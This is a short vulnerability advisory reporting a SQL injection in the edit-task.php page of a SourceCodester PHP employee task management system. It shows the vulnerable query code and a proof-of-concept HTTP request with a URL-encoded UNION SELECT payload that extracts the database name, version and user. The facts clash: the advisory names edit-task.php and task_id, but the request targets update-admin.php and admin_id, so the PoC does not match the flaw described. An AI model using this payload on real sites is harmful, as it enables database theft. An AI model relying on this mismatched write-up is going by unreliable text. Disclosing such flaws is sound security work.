# SOURCECODESTER / Employee Task Management System - SQL Injection edit-task.php

## **Credits**
> Joshua Lictan (https://github.com/skid-nochizplz/skid-nochizplz)

## Vendor Homepage:
> https://www.sourcecodester.com/php/17217/employee-management-system-php-and-mysql-free-download.html

## Affected Component
> /edit-task.php

## Code
```php
$sql = "SELECT * FROM task_info WHERE task_id='$task_id' ";
$info = $obj_admin->manage_all_info($sql);
$row = $info->fetch(PDO::FETCH_ASSOC);
```

## Proof of Concept
**HTTP Request Example**
``` http request
GET /update-admin.php?admin_id='%20union%20select%201%2cconcat('Database%20Name%3a%20'%2cdatabase())%2cconcat('Database%20Version%3a%20'%2cversion())%2cconcat('Database%20User%3a%20'%2cuser())%2c5%2c6%2c7%20--%20- HTTP/1.1
Host: 127.0.0.1
Content-Length: 0
Research-By: NoChizPlz
```

## Screenshot
![img.png](SQL%20Injection%20-%20edit-task%2Fimg.png)


